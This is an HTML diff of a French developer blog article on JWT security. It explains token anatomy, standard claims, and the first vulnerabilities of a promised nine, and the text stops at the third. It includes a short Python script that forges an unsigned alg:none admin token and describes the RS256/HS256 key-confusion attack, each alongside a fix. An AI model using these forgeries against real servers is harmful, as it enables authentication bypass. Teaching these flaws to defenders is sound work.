@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sécurité JWT : Vulnérabilités, bonnes pratiques et guide d'implémentation (2026)</title>
+<meta name="description" content="Guide développeur sur la sécurité JWT : l'attaque de l'algorithme 'none', la confusion RS256/HS256, les données sensibles dans la charge utile, le stockage des jetons, la rotation des jetons de rafraîchissement. 9 vulnérabilités expliquées avec du code. Par Mathias Kouadio.">
+<meta name="keywords" content="sécurité jwt vulnérabilités, algorithme none jwt attaque, confusion rs256 hs256, bonnes pratiques jwt 2026, guide json web token, rotation refresh token jwt, stockage jwt localstorage cookie, données sensibles payload jwt">
+<meta name="robots" content="index, follow">
+<meta name="author" content="Mathias Kouadio">
+<link rel="canonical" href="https://www.devstoolsbox.dev/fr/blog/guide-securite-jwt/">
+<link rel="alternate" hreflang="fr" href="https://www.devstoolsbox.dev/fr/blog/guide-securite-jwt/">
+<link rel="alternate" hreflang="en" href="https://www.devstoolsbox.dev/tools/blog/jwt-security-guide/">
+<link rel="alternate" hreflang="x-default" href="https://www.devstoolsbox.dev/tools/blog/jwt-security-guide/">
+
+<meta property="og:title" content="Sécurité JWT : Vulnérabilités, bonnes pratiques et guide d'implémentation (2026)">
+<meta property="og:description" content="9 vulnérabilités JWT expliquées avec des exemples réels, du code en 5 langages et le modèle correct jeton d'accès + jeton de rafraîchissement.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://www.devstoolsbox.dev/fr/blog/guide-securite-jwt/">
+<meta property="og:site_name" content="DevToolbox">
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"Article",
+  "headline":"Sécurité JWT : Vulnérabilités, bonnes pratiques et guide d'implémentation (2026)",
+  "author":{"@type":"Person","name":"Mathias Kouadio","url":"https://www.devstoolsbox.dev/fr/a-propos/"},
+  "datePublished":"2026-06-10",
+  "dateModified":"2026-06-10",
+  "mainEntityOfPage":"https://www.devstoolsbox.dev/fr/blog/guide-securite-jwt/",
+  "publisher":{"@type":"Organization","name":"DevToolbox","url":"https://www.devstoolsbox.dev/"},
+  "description":"9 vulnérabilités JWT avec des exemples réels, une implémentation sécurisée en 5 langages, le modèle de rotation des jetons de rafraîchissement et une comparaison des méthodes de stockage des jetons."
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"FAQPage",
+  "mainEntity":[
+    {"@type":"Question","name":"Qu'est-ce que la vulnérabilité 'alg:none' dans JWT ?","acceptedAnswer":{"@type":"Answer","text":"Lorsqu'un JWT spécifie alg: none dans son en-tête, il ne comporte aucune signature. Les serveurs vulnérables qui lisent l'algorithme depuis le jeton et lui font confiance sautent entièrement la vérification. Un attaquant peut forger un jeton avec n'importe quelles revendications — y compris admin: true ou un ID utilisateur arbitraire — simplement en encodant son en-tête et sa charge utile en base64url sans rien signer."}},
+    {"@type":"Question","name":"Qu'est-ce que l'attaque de confusion RS256/HS256 ?","acceptedAnswer":{"@type":"Answer","text":"Si un serveur vérifie normalement les jetons avec RS256 (asymétrique) mais accepte également HS256 (symétrique), un attaquant qui a obtenu la clé publique du serveur peut signer un jeton forgé en utilisant cette clé publique comme secret HMAC. Le serveur le vérifie ensuite avec sa propre clé publique — et accepte le jeton forgé. La correction : utiliser une bibliothèque JWT qui exige une liste explicite d'algorithmes autorisés."}},
+    {"@type":"Question","name":"Dois-je stocker les jetons JWT dans localStorage ou dans des cookies ?","acceptedAnswer":{"@type":"Answer","text":"Ne stockez jamais les jetons JWT dans localStorage ou sessionStorage. Toute vulnérabilité XSS sur votre site donne à un attaquant l'accès à tous les jetons qui y sont stockés. L'approche la plus sûre est la mémoire (une variable JavaScript dans une closure), effacée au rechargement de la page. Pour la persistance entre rechargements, utilisez un cookie httpOnly, Secure, SameSite=Strict pour le jeton de rafraîchissement et conservez le jeton d'accès à courte durée de vie en mémoire."}},
+    {"@type":"Question","name":"Qu'est-ce que la rotation des jetons de rafraîchissement ?","acceptedAnswer":{"@type":"Answer","text":"La rotation des jetons de rafraîchissement consiste à émettre un nouveau jeton de rafraîchissement chaque fois qu'un jeton d'accès est rafraîchi, et à invalider l'ancien. Si un jeton de rafraîchissement est volé, la prochaine utilisation par l'utilisateur légitime de son ancien jeton échouera (car il a déjà été renouvelé), l'alertant ainsi que le système de la compromission. Cela permet la détection du vol de jeton, ce qu'un jeton de rafraîchissement non renouvelable ne peut pas fournir."}},
+    {"@type":"Question","name":"Pourquoi ne jamais mettre de données sensibles dans la charge utile d'un JWT ?","acceptedAnswer":{"@type":"Answer","text":"Les charges utiles JWT sont encodées en Base64url, non chiffrées. Toute personne qui possède le jeton peut décoder et lire chaque champ de la charge utile sans connaître aucune clé secrète. Les mots de passe, numéros de carte bancaire et données personnelles ne doivent jamais apparaître dans un JWT. Si vous devez transmettre des revendications chiffrées, utilisez JWE (JSON Web Encryption) au lieu de JWS (JWT signé)."}},
+    {"@type":"Question","name":"Quelle est la durée de vie recommandée pour un jeton d'accès JWT ?","acceptedAnswer":{"@type":"Answer","text":"15 minutes est la recommandation la plus courante pour les jetons d'accès dans les applications sensibles. Cela limite la fenêtre d'exploitation si un jeton est volé. Associez cela à un jeton de rafraîchissement (7-30 jours, stocké dans un cookie httpOnly) qui peut émettre de nouveaux jetons d'accès sans obliger l'utilisateur à se réauthentifier."}}
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"BreadcrumbList",
+  "itemListElement":[
+    {"@type":"ListItem","position":1,"name":"Accueil","item":"https://www.devstoolsbox.dev/"},
+    {"@type":"ListItem","position":2,"name":"Blog","item":"https://www.devstoolsbox.dev/blog/"},
+    {"@type":"ListItem","position":3,"name":"Guide de sécurité JWT","item":"https://www.devstoolsbox.dev/fr/blog/guide-securite-jwt/"}
+  ]
+}
+</script>
+
+<style>
+:root{
+  --bg:#f8fafc;--surface:#ffffff;--surface2:#f1f5f9;
+  --primary:#7c3aed;--primary-hover:#6d28d9;--primary-light:rgba(124,58,237,.08);
+  --text:#0f172a;--text2:#374151;--text3:#64748b;
+  --border:#e2e8f0;--shadow:0 4px 16px rgba(0,0,0,.06);
+  --radius:14px;--code-bg:#1e293b;--code-color:#e2e8f0;
+  --mono:'SF Mono','Menlo','Cascadia Code',monospace;
+  --pass:#10b981;--warn:#f59e0b;--fail:#ef4444;
+  --pass-bg:#d1fae5;--warn-bg:#fef3c7;--fail-bg:#fee2e2;
+  --jwt-h:#ec4899;--jwt-p:#7c3aed;--jwt-s:#10b981;
+}
+body.dark{
+  --bg:#0b0f19;--surface:#151a28;--surface2:#1d2333;
+  --primary:#a78bfa;--primary-hover:#8b5cf6;
+  --text:#f1f5f9;--text2:#cbd5e1;--text3:#94a3b8;
+  --border:#2d3548;--shadow:0 4px 16px rgba(0,0,0,.35);
+  --pass-bg:#064e3b;--warn-bg:#422006;--fail-bg:#450a0a;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--text);line-height:1.75;padding:20px;min-height:100vh;transition:background .3s,color .3s;-webkit-font-smoothing:antialiased}
+.page{max-width:860px;margin:0 auto}
+
+.site-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;flex-wrap:wrap;gap:12px}
+.logo{font-weight:800;font-size:1.35rem;color:var(--primary);text-decoration:none;display:flex;align-items:center;gap:8px}
+.logo::before{content:'🛠️'}
+.header-controls{display:flex;gap:8px}
+.pill-group{background:var(--surface);border:1px solid var(--border);border-radius:40px;padding:3px;display:flex;box-shadow:var(--shadow)}
+.pill-btn{padding:6px 14px;border:none;background:transparent;font-weight:600;cursor:pointer;color:var(--text2);border-radius:32px;font-size:.8rem;transition:.18s;font-family:inherit;white-space:nowrap;text-decoration:none}
+.pill-btn.active{background:var(--primary);color:#fff}
+
+.breadcrumb{font-size:.8rem;color:var(--text3);margin-bottom:20px}
+.breadcrumb ol{list-style:none;display:flex;flex-wrap:wrap;gap:4px}
+.breadcrumb li{display:flex;align-items:center}
+.breadcrumb li+li::before{content:'/';margin:0 6px;color:var(--text3)}
+.breadcrumb a{color:var(--text2);text-decoration:none}
+.breadcrumb a:hover{color:var(--primary)}
+
+.article-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:36px;box-shadow:var(--shadow);margin-bottom:32px}
+@media(max-width:600px){.article-card{padding:20px}}
+
+h1{font-size:2rem;font-weight:800;letter-spacing:-.025em;line-height:1.25;margin-bottom:10px}
+.article-meta{font-size:.85rem;color:var(--text3);margin-bottom:28px;display:flex;gap:14px;flex-wrap:wrap}
+.article-meta time{color:var(--text2);font-weight:500}
+.article-meta a{color:var(--primary);text-decoration:none}
+h2{font-size:1.5rem;font-weight:800;margin-top:44px;margin-bottom:12px;letter-spacing:-.015em;scroll-margin-top:24px}
+h3{font-size:1.15rem;font-weight:700;margin-top:28px;margin-bottom:8px;color:var(--text)}
+h4{font-size:1rem;font-weight:700;margin-top:20px;margin-bottom:6px;color:var(--text2)}
+p{color:var(--text2);margin-bottom:16px;font-size:.97rem;line-height:1.85}
+a{color:var(--primary);text-decoration:none}
+a:hover{text-decoration:underline}
+strong{color:var(--text)}
+ul,ol{margin-left:22px;margin-bottom:16px;color:var(--text2)}
+li{margin-bottom:7px;font-size:.97rem;line-height:1.75}
+code{background:var(--code-bg);color:var(--code-color);padding:2px 7px;border-radius:4px;font-family:var(--mono);font-size:.88em}
+pre{background:var(--code-bg);color:var(--code-color);padding:18px;border-radius:12px;overflow-x:auto;margin:18px 0;font-family:var(--mono);font-size:.82rem;line-height:1.65}
+pre code{background:transparent;padding:0;font-size:inherit;border-radius:0}
+
+.callout{padding:14px 18px;border-radius:0 12px 12px 0;margin:20px 0;font-size:.9rem;color:var(--text2);line-height:1.7}
+.callout-info{background:var(--primary-light);border-left:4px solid var(--primary)}
+.callout-warn{background:var(--warn-bg);border-left:4px solid var(--warn)}
+.callout-fail{background:var(--fail-bg);border-left:4px solid var(--fail)}
+.callout-pass{background:var(--pass-bg);border-left:4px solid var(--pass)}
+body.dark .callout-warn{background:#422006}
+body.dark .callout-fail{background:#450a0a}
+body.dark .callout-pass{background:#064e3b}
+.callout strong{color:var(--text)}
+
+.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:20px 0;border-radius:12px}
+table{width:100%;border-collapse:collapse;min-width:520px}
+.dec-table{background:var(--pass-bg);border:2px solid var(--pass);border-radius:12px;overflow:hidden}
+.dec-table th,.dec-table td{padding:11px 14px;text-align:left;border-bottom:1px solid var(--border);font-size:.87rem}
+.dec-table th{background:var(--pass);color:#fff;font-weight:700;font-size:.8rem;text-transform:uppercase;letter-spacing:.05em}
+.dec-table tr:last-child td{border-bottom:none}
+.plain-table th,.plain-table td{border:1px solid var(--border);padding:9px 13px;text-align:left;font-size:.87rem}
+.plain-table th{background:var(--surface2);font-weight:700}
+
+/* JWT anatomy visual */
+.jwt-visual{font-family:var(--mono);font-size:.83rem;line-height:1.8;background:var(--surface2);border:1px solid var(--border);border-radius:12px;padding:18px;margin:18px 0;word-break:break-all}
+.jwt-h{color:var(--jwt-h);font-weight:700}
+.jwt-p{color:var(--jwt-p);font-weight:700}
+.jwt-s{color:var(--jwt-s);font-weight:700}
+.jwt-dot{color:var(--text3)}
+.jwt-legend{display:flex;gap:16px;flex-wrap:wrap;margin-top:10px;font-size:.8rem}
+.jwt-legend-item{display:flex;align-items:center;gap:6px}
+.jwt-legend-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+
+/* vulnerability cards */
+.vuln-card{border:1px solid var(--border);border-radius:12px;padding:20px;margin:16px 0}
+.vuln-card-header{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;margin-bottom:12px}
+.vuln-name{font-weight:800;font-size:1rem;color:var(--text)}
+.sev-badge{font-size:.72rem;font-weight:800;padding:3px 10px;border-radius:99px;white-space:nowrap;text-transform:uppercase;letter-spacing:.05em;flex-shrink:0}
+.sev-critical{background:var(--fail-bg);color:var(--fail)}
+.sev-high{background:#fff0e8;color:#c2410c}
+.sev-medium{background:var(--warn-bg);color:#b45309}
+.sev-low{background:var(--pass-bg);color:var(--pass)}
+.sev-info{background:var(--primary-light);color:var(--primary)}
+body.dark .sev-high{background:#4a1a00;color:#fb923c}
+.vuln-card p{margin-bottom:10px}
+.vuln-card .fix-label{font-size:.78rem;font-weight:800;text-transform:uppercase;letter-spacing:.06em;color:var(--pass);margin-bottom:4px}
+
+/* storage comparison */
+.storage-row{display:grid;grid-template-columns:110px 1fr 1fr 1fr;gap:1px;background:var(--border);border-radius:8px;overflow:hidden;margin:16px 0}
+.storage-cell{background:var(--surface);padding:10px 12px;font-size:.83rem}
+.storage-cell.header{background:var(--surface2);font-weight:700;font-size:.78rem;text-transform:uppercase;letter-spacing:.05em;color:var(--text3)}
+.storage-cell.name{font-weight:700;color:var(--text);font-family:var(--mono);font-size:.8rem}
+.ok{color:var(--pass);font-weight:700}
+.bad{color:var(--fail);font-weight:700}
+.warn-text{color:var(--warn);font-weight:700}
+@media(max-width:600px){.storage-row{grid-template-columns:1fr}}
+
+/* code tabs */
+.lang-tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:-1px}
+.lang-tab{padding:6px 14px;border-radius:8px 8px 0 0;border:1px solid var(--border);border-bottom:none;background:var(--surface2);color:var(--text2);font-size:.78rem;font-weight:700;cursor:pointer;font-family:inherit;transition:.15s}
+.lang-tab.active{background:var(--code-bg);color:var(--code-color);border-color:var(--code-bg)}
+.code-block{display:none}
+.code-block.visible{display:block}
+.code-block pre{border-radius:0 12px 12px 12px;margin-top:0}
+
+/* sequence diagram (text-based) */
+.seq-diagram{background:var(--surface2);border:1px solid var(--border);border-radius:12px;padding:18px;font-family:var(--mono);font-size:.8rem;line-height:1.8;overflow-x:auto;margin:16px 0}
+.seq-step{color:var(--text2);margin-bottom:2px}
+.seq-step .seq-actor{color:var(--primary);font-weight:700}
+.seq-step .seq-arrow{color:var(--text3)}
+.seq-step .seq-label{color:var(--text)}
+.seq-comment{color:var(--text3);font-style:italic;margin-top:4px;margin-bottom:8px}
+
+.btn-cta{display:inline-block;background:var(--primary);color:#fff !important;padding:12px 24px;border-radius:40px;font-weight:700;font-size:.9rem;text-decoration:none !important;transition:.2s;margin:8px 0}
+.btn-cta:hover{background:var(--primary-hover);transform:translateY(-1px)}
+
+.faq-item{border-top:1px solid var(--border)}
+.faq-item:last-child{border-bottom:1px solid var(--border)}
+.faq-item summary{list-style:none;padding:13px 0;cursor:pointer;font-weight:600;color:var(--text);font-size:.93rem;display:flex;justify-content:space-between;align-items:center}
+.faq-item summary::-webkit-details-marker{display:none}
+.faq-item summary::after{content:'＋';font-size:.88rem;color:var(--text3);transition:transform .2s;flex-shrink:0;margin-left:16px}
+.faq-item[open] summary::after{transform:rotate(45deg)}
+.faq-item[open] summary{color:var(--primary)}
+.faq-answer{padding:0 0 13px;color:var(--text2);font-size:.9rem;line-height:1.85}
+
+.references{margin-top:36px;padding-top:20px;border-top:1px solid var(--border)}
+.references h3{font-size:.95rem;margin-bottom:12px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:.06em}
+.ref-list{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:6px}
+.ref-list li{font-size:.83rem;color:var(--text3);display:flex;gap:8px}
+.ref-list li::before{content:'→';color:var(--primary);flex-shrink:0;margin-top:1px}
+.ref-list a{color:var(--primary)}
+
+.related-tools{background:var(--primary-light);border:1px solid rgba(124,58,237,.2);border-radius:12px;padding:18px 20px;margin-top:36px}
+.related-tools h3{font-size:.85rem;font-weight:800;color:var(--primary);text-transform:uppercase;letter-spacing:.06em;margin-bottom:10px}
+.related-tools ul{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:6px}
+.related-tools li a{font-size:.88rem;color:var(--text2)}
+.related-tools li a:hover{color:var(--primary)}
+
+.toc{background:var(--surface2);border:1px solid var(--border);border-radius:12px;padding:16px 20px;margin-bottom:28px}
+.toc-title{font-size:.78rem;font-weight:800;letter-spacing:.07em;text-transform:uppercase;color:var(--text3);margin-bottom:10px}
+.toc ol{margin-left:18px;margin-bottom:0}
+.toc li{font-size:.85rem;margin-bottom:4px}
+.toc a{color:var(--text2)}
+.toc a:hover{color:var(--primary)}
+
+.footer{text-align:center;padding:20px;border-top:1px solid var(--border);margin-top:24px;color:var(--text3);font-size:.8rem}
+.footer a{color:var(--primary);text-decoration:none}
+</style>
+</head>
+<body>
+<div class="page">
+
+<header class="site-header">
+  <a href="/" class="logo">DevToolbox</a>
+  <div class="header-controls">
+    <div class="pill-group">
+      <button class="pill-btn" id="themeBtn" onclick="toggleTheme()">🌙 Sombre</button>
+    </div>
+    <div class="pill-group">
+      <a href="/tools/blog/jwt-security-guide/" class="pill-btn">EN</a>
+      <a href="/fr/blog/guide-securite-jwt/" class="pill-btn active">FR</a>
+    </div>
+  </div>
+</header>
+
+<nav class="breadcrumb" aria-label="Fil d'Ariane">
+  <ol>
+    <li><a href="/">Accueil</a></li>
+    <li><a href="/blog/">Blog</a></li>
+    <li aria-current="page">Guide de sécurité JWT</li>
+  </ol>
+</nav>
+
+<main>
+<article itemscope itemtype="https://schema.org/Article" class="article-card">
+  <meta itemprop="datePublished" content="2026-06-10">
+  <meta itemprop="dateModified" content="2026-06-10">
+
+  <h1 itemprop="headline">Sécurité JWT : Vulnérabilités, bonnes pratiques et guide d'implémentation (2026)</h1>
+
+  <div class="article-meta">
+    <time datetime="2026-06-10">10 juin 2026</time>
+    <span>·</span>
+    <span>22 min de lecture</span>
+    <span>·</span>
+    <span>Par <a href="/fr/a-propos/" itemprop="author" itemscope itemtype="https://schema.org/Person"><span itemprop="name">Mathias Kouadio</span></a></span>
+  </div>
+
+  <nav class="toc" aria-label="Table des matières">
+    <div class="toc-title">Dans cet article</div>
+    <ol>
+      <li><a href="#incident">L'incident Auth0 qui a changé ma façon de lire la documentation JWT</a></li>
+      <li><a href="#anatomy">Anatomie d'un JWT : ce que vous envoyez réellement</a></li>
+      <li><a href="#claims">Référence des revendications standard</a></li>
+      <li><a href="#vulnerabilities">9 vulnérabilités — avec des scénarios d'attaque réels</a></li>
+      <li><a href="#implementation">Implémentation sécurisée en 5 langages</a></li>
+      <li><a href="#token-pattern">Le modèle correct jeton d'accès + jeton de rafraîchissement</a></li>
+      <li><a href="#storage">Stockage des jetons : localStorage vs cookie vs mémoire</a></li>
+      <li><a href="#faq">Foire aux questions</a></li>
+    </ol>
+  </nav>
+
+  <div itemprop="articleBody">
+
+  <!-- ══════════════════════════════════
+       SECTION 1 — INCIDENT
+  ══════════════════════════════════ -->
+  <h2 id="incident">L'incident Auth0 qui a changé ma façon de lire la documentation JWT</h2>
+
+  <p>En 2015, Tim McLean, un chercheur en sécurité, a publié une divulgation qui aurait dû être impossible. Il avait trouvé un moyen de s'authentifier en tant que n'importe quel utilisateur — y compris les administrateurs — sur des applications utilisant plusieurs bibliothèques JWT populaires, sans connaître aucune clé secrète, sans forcer quoi que ce soit par brute-force, et sans aucune attaque cryptographique. La méthode était d'une simplicité presque embarrassante.</p>
+
+  <p>Il a changé le champ <code>alg</code> dans l'en-tête JWT de <code>RS256</code> à <code>none</code>. Puis il a supprimé la signature. Puis il a changé son ID utilisateur dans la charge utile pour celui de l'administrateur. Le serveur a accepté le jeton.</p>
+
+  <p>Cela fonctionnait parce que les bibliothèques JWT de l'époque — y compris les premières versions du SDK d'Auth0 et plusieurs autres — lisaient l'algorithme depuis le jeton lui-même et l'utilisaient pour la vérification. Un attaquant qui contrôle l'en-tête du jeton contrôle également l'algorithme que le serveur utilise pour le vérifier. Avec <code>alg: none</code>, la vérification n'a tout simplement pas lieu.</p>
+
+  <p>Auth0 a corrigé le problème. La plupart des bibliothèques concernées aussi. Mais la leçon sous-jacente demeure : <strong>JWT n'est pas une boîte noire sécurisée par défaut</strong>. C'est un format qui peut être implémenté correctement ou incorrectement, et les conséquences d'une implémentation incorrecte vont du contournement complet de l'authentification à la fuite silencieuse d'informations. Cet article couvre les deux extrêmes.</p>
+
+  <div class="callout callout-info">
+    <strong>Inspectez vos jetons :</strong> Collez n'importe quel JWT dans le <a href="/fr/outils/decodeur-jwt/">Décodeur et Analyseur de sécurité JWT de DevToolbox</a> et obtenez une analyse de sécurité instantanée — vulnérabilités d'algorithme, vérifications d'expiration, revendications manquantes, détection de données sensibles. Tout fonctionne dans votre navigateur.
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 2 — ANATOMY
+  ══════════════════════════════════ -->
+  <h2 id="anatomy">Anatomie d'un JWT : ce que vous envoyez réellement</h2>
+
+  <p>Un JWT se compose de trois chaînes encodées en Base64url reliées par des points. Les couleurs ci-dessous correspondent à la façon standard dont JWT est visualisé dans la documentation et les outils de débogage.</p>
+
+  <div class="jwt-visual">
+    <span class="jwt-h">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="jwt-dot">.</span><span class="jwt-p">eyJzdWIiOiJ1c2VyXzEyMyIsIm5hbWUiOiJBbGljZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ5Mzc2ODAwLCJleHAiOjE3NDk0NjMyMDB9</span><span class="jwt-dot">.</span><span class="jwt-s">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+    <div class="jwt-legend">
+      <div class="jwt-legend-item"><div class="jwt-legend-dot" style="background:var(--jwt-h)"></div><span style="color:var(--jwt-h);font-weight:700">En-tête</span> — algorithme + type</div>
+      <div class="jwt-legend-item"><div class="jwt-legend-dot" style="background:var(--jwt-p)"></div><span style="color:var(--jwt-p);font-weight:700">Charge utile</span> — revendications (lisibles par tous)</div>
+      <div class="jwt-legend-item"><div class="jwt-legend-dot" style="background:var(--jwt-s)"></div><span style="color:var(--jwt-s);font-weight:700">Signature</span> — preuve d'intégrité</div>
+    </div>
+  </div>
+
+  <p>Une fois décodé, l'en-tête ci-dessus contient <code>{"alg":"HS256","typ":"JWT"}</code> et la charge utile contient <code>{"sub":"user_123","name":"Alice","role":"user","iat":1749376800,"exp":1749463200}</code>. Vous pouvez décoder les deux maintenant avec un décodeur base64url — aucune clé secrète nécessaire.</p>
+
+  <p>C'est la chose la plus importante à comprendre à propos des JWT, et celle qui piège le plus souvent les développeurs : <strong>la charge utile est encodée, pas chiffrée</strong>. Base64url est un encodage réversible, pas un mécanisme de sécurité. Toute personne qui intercepte ou obtient un JWT peut lire chaque champ de la charge utile sans connaître la clé secrète. La signature prouve seulement que le jeton a été émis par quelqu'un qui connaît le secret. Elle ne cache pas le contenu.</p>
+
+  <div class="callout callout-fail">
+    <strong>Ne mettez jamais de données sensibles dans la charge utile d'un JWT.</strong> Mots de passe, numéros de carte bancaire, numéros d'identité, clés API privées — rien de tout cela n'a sa place dans un jeton. Si un serveur, un CDN ou un agrégateur de logs de votre infrastructure stocke des jetons, ces données sont exposées.
+  </div>
+
+  <h3>Comment fonctionne la signature</h3>
+
+  <p>Pour les algorithmes HMAC (HS256, HS384, HS512), la signature est calculée comme suit :</p>
+
+  <pre><code>HMAC-SHA256(
+  cle_secrete,
+  base64url(header) + "." + base64url(payload)
+)</code></pre>
+
+  <p>Pour les algorithmes RSA/EC (RS256, ES256), le serveur signe avec sa clé privée et vérifie avec sa clé publique. La différence cruciale : avec HMAC, toute personne qui connaît le secret peut à la fois créer et vérifier des jetons. Avec RSA, seul le détenteur de la clé privée peut créer des jetons — la clé publique ne peut que les vérifier. Cela rend les algorithmes RSA bien mieux adaptés aux systèmes distribués où plusieurs services doivent vérifier des jetons mais ne doivent pas pouvoir en émettre.</p>
+
+  <!-- ══════════════════════════════════
+       SECTION 3 — CLAIMS
+  ══════════════════════════════════ -->
+  <h2 id="claims">Référence des revendications standard</h2>
+
+  <p>La RFC 7519 définit un ensemble de noms de revendications enregistrées. Aucune n'est obligatoire selon la spécification, mais plusieurs sont critiques pour la sécurité. Si votre bibliothèque ne valide pas <code>exp</code>, <code>iss</code> et <code>aud</code> par défaut, configurez-la explicitement.</p>
+
+  <div class="table-wrap">
+    <table class="plain-table">
+      <thead>
+        <tr><th>Revendication</th><th>Nom complet</th><th>Type</th><th>Pertinence sécurité</th><th>Absence → risque</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><code>iss</code></td><td>Émetteur</td><td>Chaîne</td><td>Qui a créé le jeton</td><td>Rejeu inter-service (jeton pour le service A accepté par le service B)</td></tr>
+        <tr><td><code>sub</code></td><td>Sujet</td><td>Chaîne</td><td>Qui le jeton représente (généralement l'ID utilisateur)</td><td>Pas de liaison d'identité</td></tr>
+        <tr><td><code>aud</code></td><td>Audience</td><td>Chaîne / Tableau</td><td>À qui le jeton est destiné</td><td>Jeton pour un service accepté par un autre</td></tr>
+        <tr><td><code>exp</code></td><td>Expiration</td><td>Timestamp Unix</td><td>Fenêtre de validité du jeton</td><td>Jeton valide indéfiniment s'il est volé</td></tr>
+        <tr><td><code>nbf</code></td><td>Pas avant</td><td>Timestamp Unix</td><td>Jeton non valide avant cette date</td><td>Jeton utilisable avant la date prévue</td></tr>
+        <tr><td><code>iat</code></td><td>Émis à</td><td>Timestamp Unix</td><td>Date de création du jeton, permet les vérifications d'âge</td><td>Impossible de déterminer l'âge du jeton ou d'appliquer une durée de vie maximale</td></tr>
+        <tr><td><code>jti</code></td><td>JWT ID</td><td>Chaîne (UUID)</td><td>Identifiant unique, permet la révocation et la protection anti-rejeu</td><td>Impossible de révoquer des jetons individuels ; attaques par rejeu possibles</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 4 — VULNERABILITIES
+  ══════════════════════════════════ -->
+  <h2 id="vulnerabilities">9 vulnérabilités — avec des scénarios d'attaque réels</h2>
+
+  <p>Voici les vulnérabilités qui apparaissent le plus souvent dans les audits de sécurité JWT et les défis CTF. Chacune a un historique documenté réel. Je les ai classées par sévérité et j'ai inclus le mécanisme exact pour que vous compreniez pourquoi cela fonctionne, pas seulement que cela fonctionne.</p>
+
+  <!-- VULN 1 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">1. Algorithme "none" — contournement d'authentification</div>
+      <span class="sev-badge sev-critical">Critique</span>
+    </div>
+    <p>Documenté dans CVE-2015-9235. L'attaque : changez <code>"alg":"HS256"</code> en <code>"alg":"none"</code> dans l'en-tête, supprimez la signature, modifiez n'importe quelle revendication dans la charge utile. Les serveurs vulnérables lisent l'algorithme depuis le jeton et sautent entièrement la vérification.</p>
+    <pre><code># Construction d'un jeton forgé (à des fins éducatives)
+import base64, json
+
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "admin", "role": "administrator", "exp": 9999999999}
+
+def b64url(data: dict) -> str:
+    return base64.urlsafe_b64encode(
+        json.dumps(data, separators=(',',':')).encode()
+    ).rstrip(b'=').decode()
+
+forge = f"{b64url(header)}.{b64url(payload)}."  # Signature vide
+print(forge)</code></pre>
+    <div class="fix-label">Correction</div>
+    <p>Ne lisez jamais l'algorithme depuis le jeton. Codez en dur l'algorithme attendu dans votre code de vérification. Utilisez une bibliothèque qui exige un paramètre <code>algorithms</code> explicite et qui rejette <code>none</code>.</p>
+    <pre><code># Python — configuration sécurisée PyJWT
+import jwt
+
+# ❌ Vulnérable : algorithme lu depuis l'en-tête du jeton
+decoded = jwt.decode(token, key, algorithms=jwt.get_algorithms_for_key(key))
+
+# ✅ Correct : liste explicite autorisée, none n'est jamais acceptable
+decoded = jwt.decode(
+    token, key,
+    algorithms=["HS256"],  # Accepter uniquement cet algorithme exact
+    options={"verify_alg": True}
+)</code></pre>
+  </div>
+
+  <!-- VULN 2 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">2. Confusion d'algorithme RS256 → HS256</div>
+      <span class="sev-badge sev-critical">Critique</span>
+    </div>
+    <p>Si un serveur utilise normalement RS256 mais accepte également HS256, un attaquant qui a obtenu la clé publique du serveur (souvent disponible à <code>/.well-known/jwks.json</code>) peut signer un jeton forgé en utilisant cette clé publique comme secret HMAC. Le serveur le vérifie ensuite avec sa propre clé publique — et accepte le jeton.</p>
+    <p>La raison pour laquelle cela fonctionne : une clé publique RS256 est une longue chaîne. Si la bibliothèque du serveur accepte les jetons HS256 et qu'on lui donne la "clé" de vérification pour RS256, elle pourrait utiliser cette chaîne de clé publique comme secret HMAC pour la vérification HS256. L'attaquant signe avec la même chaîne. La vérification réussit.</p>
+    <div class="fix-label">Correction</div>
+    <p>Maintenez une liste d'algorithmes autorisés stricte. Ne mélangez jamais les algorithmes symétriques et asymétriques sur le même point de terminaison. Si vous utilisez RS256, n'acceptez que RS256.</p>
+    <pre><code>// Node.js — configuration sécurisée jsonwebtoken
+const jwt = require('jsonwebtoken');
+const fs  = require('fs');
+
+const PUBLIC_KEY = fs.readFileSync('./cles/publique.pem');
+
+// ❌ Vulnérable : accepte les deux algorithmes
+const decoded = jwt.verify(token, PUBLIC_KEY);  // Pas de restriction d'algorithme
+
+// ✅ Correct : algorithme asymétrique explicite uniquement
+const decoded = jwt.verify(token, PUBLIC_KEY, {
+  algorithms: ['RS256']  // Rejeter HS256 même si l'en-tête le demande
+});</code></pre>
+  </div>
+
+  <!-- VULN 3 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">3. Pas de revendication d'expiration (exp)</div>
+      <span class="sev-badge sev-high">Élevée</span>
+    </div>
